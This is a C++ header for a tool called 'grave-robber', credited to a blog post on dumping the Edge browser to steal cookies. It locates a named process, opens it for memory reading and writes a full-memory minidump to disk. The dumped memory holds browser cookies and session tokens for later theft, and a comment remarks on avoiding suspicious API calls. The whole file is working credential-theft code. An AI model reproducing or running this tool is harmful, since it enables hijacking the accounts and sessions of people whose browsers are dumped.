// grave-robber is brought to you by ALB & https://medium.com/@s12deff/dumping-edge-browser-to-steal-cookies-cb5d659917d2.

#pragma once
#include <Windows.h>
#include <TlHelp32.h>
#include <minidumpapiset.h>
#include <stdio.h>

#pragma comment(lib, "Dbghelp.lib")

#define DEBUG TRUE
#define DBG(var) if ( DEBUG ) { printf("[::] %s = %p\n", #var, var); }
#define DBG_STR(var) if (DEBUG) { printf("[*] %s = %s\n", #var, var); }
#define DBG_WSTR(var) if (DEBUG) { printf("[*] %s = %S\n", #var, var); }
#define DBG_PRINT(str) if (DEBUG) { printf("[*] %s \n", str); }
#define DBG_INT(var) if (DEBUG) { printf("[*] %s = %d\n", #var, var); }
#define DBG_NEWLINE() if (DEBUG) { printf("\n"); }

class grvRbr {
	DWORD procId;

	DWORD getProcIDFromName() {
		DWORD procId = 0;
		// CreateToolhelp32Snapshot isn't ideal, but as far as I'm aware there isn't a less suspicious way to do this
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (hSnapshot == INVALID_HANDLE_VALUE) {
			DBG_PRINT("ERROR ON FUNCTION RETURN\n\t\\__INVALID_HANDLE_VALUE returned from CreateToolhelp32Snapshot grvRbr::getProcIDFromName");
			return -1;
		}

		PROCESSENTRY32W pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(hSnapshot, &pe32)) {
			do {
				// Compare two wchar_t arrays with _wcsicmp() to find process name
				if (_wcsicmp(grvRbr::procName, pe32.szExeFile) == 0) {
					grvRbr::procId = pe32.th32ProcessID;
					break;
				}
			} while (Process32NextW(hSnapshot, &pe32));
		}

		CloseHandle(hSnapshot);
		DBG_INT(grvRbr::procId)
		return grvRbr::procId;
	}

public:
	const wchar_t* procName;
	const wchar_t* dumpPath;

	bool dumpProc() {
		int idStatus = getProcIDFromName();
		if (idStatus == -1) {
			return false;
		}
		else if (!grvRbr::procId) {
			DBG_PRINT("ERROR\n\t\\__grvRbr::dumpProc() couldn't find a process ID. Check the passed process name is correct.");
			DBG_INT(GetLastError());
			return false;
		}

		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, grvRbr::procId);
		if (hProcess == NULL) {
			DBG_PRINT("ERROR\n\t\\__grvRbr::dumpProc() couldn't get a handle to desired process with PROCESS_QUERY_INFORMATION and PROCESS_VM_READ flags.");
			DBG_INT(GetLastError());
			return false;
		}

		HANDLE hFile = CreateFileW(grvRbr::dumpPath, GENERIC_WRITE, 0x00000001, nullptr, 2, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, nullptr);
		if (hFile == INVALID_HANDLE_VALUE) {
			DBG_PRINT("ERROR\n\t\\__grvRbr::dumpProc() couldn't get a handle from CreateFileW()");
			DBG_INT(GetLastError());
			return false;
		}

		MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
			MiniDumpWithFullMemory |
			MiniDumpWithHandleData |
			MiniDumpWithUnloadedModules |
			MiniDumpWithFullMemoryInfo |
			MiniDumpWithThreadInfo |
			MiniDumpWithTokenInformation
			);

		BOOL dumpStatus = MiniDumpWriteDump(
			hProcess,
			grvRbr::procId,
			hFile,
			dumpType,
			nullptr,
			nullptr,
			nullptr
		);

		if (!dumpStatus) {
			DBG_PRINT("ERROR\n\t\\__grvRbr::dumpProc() faced error during MiniDumpWriteDump(), see GetLastError code for more information.\n'If the operation is canceled, the last error code is HRESULT_FROM_WIN32(ERROR_CANCELLED). - MSDOC'");
			DBG_INT(GetLastError());
			return false;
		}

		CloseHandle(hFile);
		CloseHandle(hProcess);
		return true;
	}
};